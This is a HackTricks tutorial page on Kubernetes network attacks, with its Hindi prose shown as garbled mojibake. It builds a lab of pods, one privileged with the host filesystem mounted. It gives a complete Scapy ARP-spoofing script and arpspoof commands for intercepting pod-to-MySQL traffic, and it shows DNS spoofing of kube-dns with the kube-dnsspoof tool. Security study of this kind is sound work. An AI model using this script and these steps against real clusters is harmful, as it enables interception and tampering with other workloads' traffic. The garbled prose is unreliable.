# Kubernetes рдиреЗрдЯрд╡рд░реНрдХ рд╣рдорд▓реЗ

{% hint style="success" %}
AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг AWS рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks рдкреНрд░рд╢рд┐рдХреНрд╖рдг GCP рд░реЗрдб рдЯреАрдо рдПрдХреНрд╕рдкрд░реНрдЯ (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХрд╛ рд╕рдорд░реНрдерди рдХрд░реЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github рд░реЗрдкреЛ рдореЗрдВред

</details>
{% endhint %}

## рдкрд░рд┐рдЪрдп

рдХреБрдмрд░рдиреЗрдЯреАрд╕ рдореЗрдВ, рдПрдХ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬреЛ **рдПрдХ рд╣реА рдиреЛрдб рдкрд░ рд╕реНрдерд┐рдд рд╕рднреА рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЗ рдмреАрдЪ рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ**ред рдпрд╣ рдирд╛рдорд╕реНрдерд╛рди рднреЗрджреЛрдВ рдХреЗ рдмрд╛рд╡рдЬреВрдж рд▓рд╛рдЧреВ рд╣реЛрддрд╛ рд╣реИред рдРрд╕реА рдХрдиреЗрдХреНрдЯрд┐рд╡рд┐рдЯреА **рд▓реЗрдпрд░ 2** (рдИрдерд░рдиреЗрдЯ) рддрдХ рдлреИрд▓рддреА рд╣реИред рдЗрд╕ рдкрд░рд┐рдХрд▓рди рд╕реЗ, рдпрд╣ рд╡реНрдпрд╡рд╕реНрдерд╛ рд╕рдВрднрд╛рд╡рдирд╛рддрдГ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рд╕реБрд░рдХреНрд╖рд╛ рджреЛрд╖реЛрдВ рдХреЗ рд▓рд┐рдП рдЙрдЬрд╛рдЧрд░ рдХрд░рддреА рд╣реИред рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ, рдпрд╣ рдПрдХ **рдХреБрдмрд░рдиреЗрдЯреАрд╕ рдкрд░ рд╕реНрдерд┐рдд рдЕрдиреНрдп рдХрдВрдЯреЗрдирд░реЛрдВ рдкрд░ ARP рд╕реНрдкреВрдлрд┐рдВрдЧ рд╣рдорд▓рд╛** рдХрд░рдиреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛ рдЦреЛрд▓рддрд╛ рд╣реИред рдЗрд╕ рддрд░рд╣ рдХреЗ рд╣рдорд▓реЗ рдХреЗ рджреМрд░рд╛рди, рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг рдХрдВрдЯреЗрдирд░ рдЕрдиреНрдп рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЗ рд▓рд┐рдП рдиреЗрдЯрд╡рд░реНрдХ рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдзреЛрдЦрд╛рдзрдбрд╝реА рд╕реЗ рд░реЛрдХ рд╕рдХрддрд╛ рд╣реИ рдпрд╛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред

ARP рд╕реНрдкреВрдлрд┐рдВрдЧ рд╣рдорд▓реЗ рдореЗрдВ **рд╣рдорд▓рд╛рд╡рд░ рдирдХрд▓реА ARP** (рдкрддрд╛ рд╕рдВрдХреЗрддрди рдкреНрд░реЛрдЯреЛрдХреЙрд▓) рд╕рдВрджреЗрд╢ рдПрдХ рд╕реНрдерд╛рдиреАрдп рдХреНрд╖реЗрддреНрд░ рдиреЗрдЯрд╡рд░реНрдХ рдкрд░ рднреЗрдЬрддрд╛ рд╣реИред рдЗрд╕рд╕реЗ **рд╣рдорд▓рд╛рд╡рд░ рдХрд╛ MAC рдкрддрд╛ рдЕрд╕рд▓реА рдХрдВрдкреНрдпреВрдЯрд░ рдпрд╛ рд╕рд░реНрд╡рд░ рдХреЗ IP рдкрддреЗ рдХреЗ рд╕рд╛рде рдЬреЛрдбрд╝ рдЬрд╛рддрд╛ рд╣реИ**ред рдРрд╕реЗ рд╣рдорд▓реЗ рдХреЗ рд╕рдлрд▓ рдЕрдорд▓ рдХреЗ рдмрд╛рдж, рд╣рдорд▓рд╛рд╡рд░ рдбреЗрдЯрд╛ рдХреЛ рдЗрдВрдЯрд░рд╕реЗрдкреНрдЯ, рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ, рдпрд╛ рдпрд╣рд╛рдБ рддрдХ рдХрд┐ рд░реЛрдХ рд╕рдХрддрд╛ рд╣реИред рдпрд╣ рд╣рдорд▓рд╛ OSI рдореЙрдбрд▓ рдХреЗ рд▓реЗрдпрд░ 2 рдкрд░ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдХреБрдмрд░рдиреЗрдЯреАрд╕ рдореЗрдВ рдЗрд╕ рд╕реНрддрд░ рдкрд░ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдХрдиреЗрдХреНрдЯрд┐рд╡рд┐рдЯреА рд╕реБрд░рдХреНрд╖рд╛ рд╕рдВрдмрдВрдзрд┐рдд рдЪрд┐рдВрддрд╛рдУрдВ рдХреЛ рдЙрдард╛рддреА рд╣реИред

рд╕реНрдерд┐рддрд┐ рдореЗрдВ 4 рдорд╢реАрдиреЗрдВ рдмрдирд╛рдИ рдЬрд╛ рд░рд╣реА рд╣реИрдВ:

* ubuntu-pe: рдиреЛрдб рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓рдиреЗ рдФрд░ рдореИрдЯреНрд░рд┐рдХреНрд╕ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХреГрдд рдорд╢реАрди (рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рдирд╣реАрдВ)
* **ubuntu-attack**: рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдиреЗрдорд╕реНрдерд╛рди рдореЗрдВ **рджреБрд░реНрднрд╛рдЧреНрдпрдкреВрд░реНрдг** рдХрдВрдЯреЗрдирд░
* **ubuntu-victim**: kube-system рдиреЗрдорд╕реНрдерд╛рди рдореЗрдВ **рд╢рд┐рдХрд╛рд░** рдорд╢реАрди
* **mysql**: рдбрд┐рдлрд╝реЙрд▓реНрдЯ рдиреЗрдорд╕реНрдерд╛рди рдореЗрдВ **рд╢рд┐рдХрд╛рд░** рдорд╢реАрди
```yaml
echo 'apiVersion: v1
kind: Pod
metadata:
name: ubuntu-pe
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-pe
securityContext:
allowPrivilegeEscalation: true
privileged: true
runAsUser: 0
volumeMounts:
- mountPath: /host
name: host-volume
restartPolicy: Never
hostIPC: true
hostNetwork: true
hostPID: true
volumes:
- name: host-volume
hostPath:
path: /
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-attack
labels:
app: ubuntu
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-attack
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: ubuntu-victim
namespace: kube-system
spec:
containers:
- image: ubuntu
command:
- "sleep"
- "360000"
imagePullPolicy: IfNotPresent
name: ubuntu-victim
restartPolicy: Never
---
apiVersion: v1
kind: Pod
metadata:
name: mysql
spec:
containers:
- image: mysql:5.6
ports:
- containerPort: 3306
imagePullPolicy: IfNotPresent
name: mysql
env:
- name: MYSQL_ROOT_PASSWORD
value: mysql
restartPolicy: Never' | kubectl apply -f -
```

```bash
kubectl exec -it ubuntu-attack -- bash -c "apt update; apt install -y net-tools python3-pip python3 ngrep nano dnsutils; pip3 install scapy; bash"
kubectl exec -it ubuntu-victim -n kube-system -- bash -c "apt update; apt install -y net-tools curl netcat mysql-client; bash"
kubectl exec -it mysql bash -- bash -c "apt update; apt install -y net-tools; bash"
```
## рдореВрд▓ Kubernetes рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ

рдпрджрд┐ рдЖрдк рдпрд╣рд╛рдБ рдкреЗрд╢ рдХрд┐рдП рдЧрдП рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ рд╡рд┐рд╖рдпреЛрдВ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рд╕рдВрджрд░реНрднреЛрдВ рдкрд░ рдЬрд╛рдПрдВред

### ARP

рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ, **рдиреЛрдб рдХреЗ рдЕрдВрджрд░ рдкреЙрдб рд╕реЗ рдкреЙрдб рдиреЗрдЯрд╡рд░реНрдХрд┐рдВрдЧ** рдПрдХ **рдмреНрд░рд┐рдЬ** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрдкрд▓рдмреНрдз рд╣реИ рдЬреЛ рд╕рднреА рдкреЙрдб рдХреЛ рдХрдиреЗрдХреНрдЯ рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рдмреНрд░рд┐рдЬ рдХреЛ тАЬ**cbr0**тАЭ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИред (рдХреБрдЫ рдиреЗрдЯрд╡рд░реНрдХ рдкреНрд▓рдЧрдЗрди рдЕрдкрдирд╛ рдмреНрд░рд┐рдЬ рдЗрдВрд╕реНрдЯреЙрд▓ рдХрд░реЗрдВрдЧреЗред) **cbr0 ARP** (рдкрддрд╛ рд╕рдВрдХреЗрддрди рдкреНрд░реЛрдЯреЛрдХреЙрд▓) рд╕рдВрдХреЗрддрди рдХреЛ рднреА рд╕рдВрднрд╛рд▓ рд╕рдХрддрд╛ рд╣реИред рдЬрдм cbr0 рдкрд░ рдПрдХ рдЖрдиреЗ рд╡рд╛рд▓рд╛ рдкреИрдХреЗрдЯ рдкрд╣реБрдВрдЪрддрд╛ рд╣реИ, рддреЛ рдпрд╣ ARP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЧрдВрддрд╡реНрдп MAC рдкрддрд╛ рд╕рдВрдХреЗрддрди рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдпрд╣ рддрдереНрдп рдЗрд╕ рдмрд╛рдд рдХрд╛ рд╕рдВрдХреЗрдд рджреЗрддрд╛ рд╣реИ рдХрд┐, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, **рдПрдХ рд╣реА рдиреЛрдб рдореЗрдВ рдЪрд▓ рд░рд╣реЗ рд╣рд░ рдкреЙрдб** рдХреЛ рдЙрд╕реА рдиреЛрдб рдореЗрдВ рдХрд┐рд╕реА рднреА рдЕрдиреНрдп рдкреЙрдб рдХреЗ рд╕рд╛рде (рдиреЗрдорд╕реНрдкреЗрд╕ рдХреА рдЕрдирджрд░ рдирд┐рд░реНрднрд░рддрд╛ рдХреЗ рдмрд┐рдирд╛) рдИрдерд░рдиреЗрдЯ рд╕реНрддрд░ (рд▓реЗрдпрд░ 2) рдкрд░ **рд╕рдВрд╡рд╛рдж** рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛрдЧреАред

{% hint style="warning" %}
рдЗрд╕рд▓рд┐рдП, **рдПрдХ рд╣реА рдиреЛрдб рдореЗрдВ рдкреЙрдб рдХреЗ рдмреАрдЪ ARP рд╕реНрдкреВрдлрд┐рдВрдЧ рд╣рдорд▓реЗ рдХрд░рдирд╛ рд╕рдВрднрд╡** рд╣реИред
{% endhint %}

### DNS

Kubernetes рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдЖрдкрдХреЛ рд╕рд╛рдорд╛рдиреНрдп рд░реВрдк рд╕реЗ 1 (рдпрд╛ рдЕрдзрд┐рдХ) **DNS рд╕реЗрд╡рд╛рдПрдВ рдЪрд▓рддреЗ** рд╣реБрдП рдорд┐рд▓реЗрдВрдЧреА рдЬреЛ рдЖрдо рддреМрд░ рдкрд░ kube-system рдиреЗрдорд╕реНрдкреЗрд╕ рдореЗрдВ рд╣реЛрддреА рд╣реИрдВ:
```bash
kubectl -n kube-system describe services
Name:              kube-dns
Namespace:         kube-system
Labels:            k8s-app=kube-dns
kubernetes.io/cluster-service=true
kubernetes.io/name=KubeDNS
Annotations:       prometheus.io/port: 9153
prometheus.io/scrape: true
Selector:          k8s-app=kube-dns
Type:              ClusterIP
IP Families:       <none>
IP:                10.96.0.10
IPs:               10.96.0.10
Port:              dns  53/UDP
TargetPort:        53/UDP
Endpoints:         172.17.0.2:53
Port:              dns-tcp  53/TCP
TargetPort:        53/TCP
Endpoints:         172.17.0.2:53
Port:              metrics  9153/TCP
TargetPort:        9153/TCP
Endpoints:         172.17.0.2:9153
```
рдкрд┐рдЫрд▓реА рдЬрд╛рдирдХрд╛рд░реА рдореЗрдВ рдЖрдкрдХреЛ рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рджрд┐рдЦрд╛рдИ рджреЗ рд░рд╣рд╛ рд╣реИ, **рд╕реЗрд╡рд╛ рдХрд╛ рдЖрдИрдкреА** **10.96.0.10** рд╣реИ рд▓реЗрдХрд┐рди рд╕реЗрд╡рд╛ рдЪрд▓рд╛рдиреЗ рд╡рд╛рд▓реЗ **рдкреЙрдб рдХрд╛ рдЖрдИрдкреА** **172.17.0.2** рд╣реИред

рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рднреА рдкреЙрдб рдореЗрдВ DNS рдкрддрд╛ рдЬрд╛рдВрдЪрддреЗ рд╣реИрдВ рддреЛ рдЖрдкрдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреБрдЫ рдРрд╕рд╛ рдорд┐рд▓реЗрдЧрд╛:
```
cat /etc/resolv.conf
nameserver 10.96.0.10
```
рд╣рд╛рд▓рд╛рдВрдХрд┐, **рдкреЙрдб** рдХреЛ рдЙрд╕ **рдкрддреЗ** рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХрд╛ рддрд░реАрдХрд╛ **рдкрддрд╛ рдирд╣реАрдВ рд╣реИ** рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ **рдкреЙрдб рд░реЗрдВрдЬ** 172.17.0.10/26 рд╣реИред

рдЗрд╕рд▓рд┐рдП, рдкреЙрдб **DNS рдЕрдиреБрд░реЛрдз** рдХреЛ **рдкрддрд╛ 10.96.0.10** рдкрд░ рднреЗрдЬреЗрдЧрд╛ рдЬрд┐рд╕реЗ cbr0 рджреНрд╡рд╛рд░рд╛ **172.17.0.2** рдореЗрдВ **рдЕрдиреБрд╡рд╛рджрд┐рдд** рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

{% hint style="warning" %}
рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ **рдкреЙрдб** рдХрд╛ **DNS рдЕрдиреБрд░реЛрдз** рд╣рдореЗрд╢рд╛ **рдмреНрд░рд┐рдЬ** рддрдХ рдЬрд╛рдПрдЧрд╛ рддрд╛рдХрд┐ **рд╕реЗрд╡рд╛ IP рдХреЛ рдЕрдВрдд рдмрд┐рдВрджреБ IP рдореЗрдВ рдЕрдиреБрд╡рд╛рджрд┐рдд** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рдЪрд╛рд╣реЗ DNS рд╕рд░реНрд╡рд░ рдкреЙрдб рдХреЗ рд╕рдорд╛рди рд╕рдмрдиреЗрдЯрд╡рд░реНрдХ рдореЗрдВ рд╣реЛ рдпрд╛ рди рд╣реЛред

рдЗрд╕реЗ рдЬрд╛рдирдХрд░ рдФрд░ рдЬрд╛рдирдХрд░реА рд╣реЛрдиреЗ рдкрд░ рдХрд┐ **ARP рд╣рдорд▓реЗ рд╕рдВрднрд╡ рд╣реИрдВ**, рдиреЛрдб рдореЗрдВ рдПрдХ **рдкреЙрдб** рд╕рдХреНрд╖рдо рд╣реЛрдЧрд╛ **рдкреЙрдб рдХреЗ рд╣рд░ рдкреЙрдб** рдФрд░ **рдмреНрд░рд┐рдЬ** рдХреЗ рдмреАрдЪ рдХреА **рдпрд╛рддрд╛рдпрд╛рдд рдХреЛ рд░реЛрдХрдиреЗ** рдХреЗ рд▓рд┐рдП рдФрд░ **DNS рд╕рд░реНрд╡рд░** рд╕реЗ **DNS рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдВ рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП (**DNS рд╕реНрдкреВрдлрд┐рдВрдЧ**).

рдЗрд╕рдХреЗ рдЕрддрд┐рд░рд┐рдХреНрдд, рдпрджрд┐ **DNS рд╕рд░реНрд╡рд░** рд╣рдорд▓рд╛рд╡рд░ рдХреЗ **рдЙрд╕реА рдиреЛрдб рдореЗрдВ** рд╣реИ, рддреЛ рд╣рдорд▓рд╛рд╡рд░ рдХрд┐рд╕реА рднреА рдкреЙрдб рдХреЗ рд╕рднреА DNS рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ (DNS рд╕рд░реНрд╡рд░ рдФрд░ рдмреНрд░рд┐рдЬ рдХреЗ рдмреАрдЪ) рд░реЛрдХ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдВ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИред
{% endhint %}

## ARP рд╕реНрдкреВрдлрд┐рдВрдЧ рдкреЙрдбреНрд╕ рдореЗрдВ рдПрдХ рд╣реА рдиреЛрдб рдореЗрдВ

рд╣рдорд╛рд░рд╛ рд▓рдХреНрд╖реНрдп рд╣реИ рдХрдо рд╕реЗ рдХрдо **рдпреВрдмрдВрдЯреВ-рд╡рд┐рдХреНрдЯрд┐рдо рд╕реЗ mysql** рддрдХ рдХрдореНрдпреБрдирд┐рдХреЗрд╢рди **рдЪреБрд░рд╛рдирд╛**ред

### Scapy
```bash
python3 /tmp/arp_spoof.py
Enter Target IP:172.17.0.10 #ubuntu-victim
Enter Gateway IP:172.17.0.9 #mysql
Target MAC 02:42:ac:11:00:0a
Gateway MAC: 02:42:ac:11:00:09
Sending spoofed ARP responses

# Get another shell
kubectl exec -it ubuntu-attack -- bash
ngrep -d eth0

# Login from ubuntu-victim and mysql and check the unencrypted communication
# interacting with the mysql instance
```
{% code title="arp_spoof.py" %}
```python
#From https://gist.github.com/rbn15/bc054f9a84489dbdfc35d333e3d63c87#file-arpspoofer-py
from scapy.all import *

def getmac(targetip):
arppacket= Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=targetip)
targetmac= srp(arppacket, timeout=2 , verbose= False)[0][0][1].hwsrc
return targetmac

def spoofarpcache(targetip, targetmac, sourceip):
spoofed= ARP(op=2 , pdst=targetip, psrc=sourceip, hwdst= targetmac)
send(spoofed, verbose= False)

def restorearp(targetip, targetmac, sourceip, sourcemac):
packet= ARP(op=2 , hwsrc=sourcemac , psrc= sourceip, hwdst= targetmac , pdst= targetip)
send(packet, verbose=False)
print("ARP Table restored to normal for", targetip)

def main():
targetip= input("Enter Target IP:")
gatewayip= input("Enter Gateway IP:")

try:
targetmac= getmac(targetip)
print("Target MAC", targetmac)
except:
print("Target machine did not respond to ARP broadcast")
quit()

try:
gatewaymac= getmac(gatewayip)
print("Gateway MAC:", gatewaymac)
except:
print("Gateway is unreachable")
quit()
try:
print("Sending spoofed ARP responses")
while True:
spoofarpcache(targetip, targetmac, gatewayip)
spoofarpcache(gatewayip, gatewaymac, targetip)
except KeyboardInterrupt:
print("ARP spoofing stopped")
restorearp(gatewayip, gatewaymac, targetip, targetmac)
restorearp(targetip, targetmac, gatewayip, gatewaymac)
quit()

if __name__=="__main__":
main()

# To enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward
```
{% endcode %}

### ARPSpoof
```bash
apt install dsniff
arpspoof -t 172.17.0.9 172.17.0.10
```
## DNS рд╕реНрдкреВрдлрд┐рдВрдЧ

рдЬреИрд╕рд╛ рдХрд┐ рдкрд╣рд▓реЗ рд╣реА рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛, рдЕрдЧрд░ рдЖрдк **DNS рд╕рд░реНрд╡рд░ рдкреЙрдб рдХреЗ рд╕рдорд╛рди рдиреЛрдб рдореЗрдВ рдПрдХ рдкреЙрдб рдХреЛ рдХрдВрдкреНрд░реЛрдорд╛рдЗрдЬ** рдХрд░ рд▓реЗрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк **ARPSpoofing** рдХреЗ рд╕рд╛рде **рдмреНрд░рд┐рдЬ рдФрд░ DNS** рдкреЙрдб рдХреЛ **MitM** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ **рд╕рднреА DNS рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ рдмрд╣реБрдд рдЕрдЪреНрдЫрд╛ **рдЙрдкрдХрд░рдг** рдФрд░ **рдЯреНрдпреВрдЯреЛрд░рд┐рдпрд▓** рд╣реИ рдЬрд┐рд╕рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП [**https://github.com/danielsagi/kube-dnsspoof/**](https://github.com/danielsagi/kube-dnsspoof/) рдкрд░ рдЬрд╛рдПрдВред

рд╣рдорд╛рд░реЗ рд╕реНрдерд┐рддрд┐ рдореЗрдВ, рд╣рдореЗрдВ **рд╣рдорд▓рд╛рд╡рд░ рдкреЙрдб рдореЗрдВ рдЙрдкрдХрд░рдг** рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рд╣реИ рдФрд░ рдПрдХ \*\*`hosts` рдирд╛рдордХ рдлрд╝рд╛рдЗрд▓ рдмрдирд╛рдиреА рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдЖрдкрдХреЛ **рд╕реНрдкреВрдл** рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП **рдбреЛрдореЗрди** рдЬреИрд╕реЗ:
```
cat hosts
google.com. 1.1.1.1
```
рдпреВрдмрдВрдЯреВ-рд╡рд┐рдХреНрдЯрд┐рдо рдорд╢реАрди рдкрд░ рд╣рдорд▓рд╛ рдХрд░реЗрдВ:
```
python3 exploit.py --direct 172.17.0.10
[*] starting attack on direct mode to pod 172.17.0.10
Bridge:  172.17.0.1 02:42:bd:63:07:8d
Kube-dns:  172.17.0.2 02:42:ac:11:00:02

[+] Taking over DNS requests from kube-dns. press Ctrl+C to stop
```

```bash
#In the ubuntu machine
dig google.com
[...]
;; ANSWER SECTION:
google.com.		1	IN	A	1.1.1.1
```
{% hint style="info" %}
рдпрджрд┐ рдЖрдк рдЕрдкрдирд╛ рдЦреБрдж рдХрд╛ DNS рд╕реНрдкреВрдлрд┐рдВрдЧ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдмрдирд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВ, рдФрд░ рдЖрдк **рдХреЗрд╡рд▓ DNS рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдпрд╣ **рдХрд╛рдо рдирд╣реАрдВ** рдХрд░реЗрдЧрд╛, рдХреНрдпреЛрдВрдХрд┐ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рдореЗрдВ рдПрдХ **src IP** рд╣реЛрдЧрд╛ рдЬреЛ рд╣реИ **рджреБрд╖реНрдЯ pod** рдХрд╛ IP рдкрддрд╛ рдФрд░ рдпрд╣ **рд╕реНрд╡реАрдХрд╛рд░ рдирд╣реАрдВ** рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред\
рдЖрдкрдХреЛ рдПрдХ **рдирдпрд╛ DNS рдкреИрдХреЗрдЯ** рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ **DNS** рдХрд╛ **src IP** рд╣реЛ рдЬрд╣рд╛рдВ рдкреАрдбрд╝рд┐рдд рдиреЗ DNS рдЕрдиреБрд░реЛрдз рднреЗрдЬрд╛ рд╣реИ (рдЬреЛ рдХреБрдЫ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╣реИ 172.16.0.2, рдирд╣реАрдВ 10.96.0.10, рдпрд╣ K8s DNS рд╕реЗрд╡рд╛ IP рд╣реИ рдФрд░ рди рдХрд┐ DNS рд╕рд░реНрд╡рд░ IP, рдЗрд╕рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдкреНрд░рд╛рд░рдВрдн рдореЗрдВред)
{% endhint %}

## рдЯреНрд░реИрдлрд┐рдХ рдХреЛ рдЬрдХрдбрд╝рдирд╛

рдЙрдкрдХрд░рдг [**Mizu**](https://github.com/up9inc/mizu) рдПрдХ рд╕рд░рд▓-рдлрд┐рд░-рднреА-рд╢рдХреНрддрд┐рд╢рд╛рд▓реА API **рдЯреНрд░реИрдлрд┐рдХ рджрд░реНрд╢рдХ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдп рдХрд░рддрд╛ рд╣реИ рдЬреЛ Kubernetes рдХреЗ рд▓рд┐рдП** рдЖрдкрдХреЛ рд╕рдХреНрд╖рдо рдХрд░рддрд╛ рд╣реИ **рд╕рднреА API рд╕рдВрдЪрд╛рд░ рдХреЛ рджреЗрдЦрдиреЗ** рдХреЗ рдмреАрдЪ рдорд╛рдЗрдХреНрд░реЛрд╕рд░реНрд╡рд┐рд╕ рдХреЗ рдмреАрдЪ рдФрд░ рдЖрдкрдХреЛ рдбреАрдмрдЧ рдФрд░ рдкреБрдирд░рд╛рд╡реГрддреНрддрд┐рдпреЛрдВ рдХреА рд╕рд╣рд╛рдпрддрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдПред\
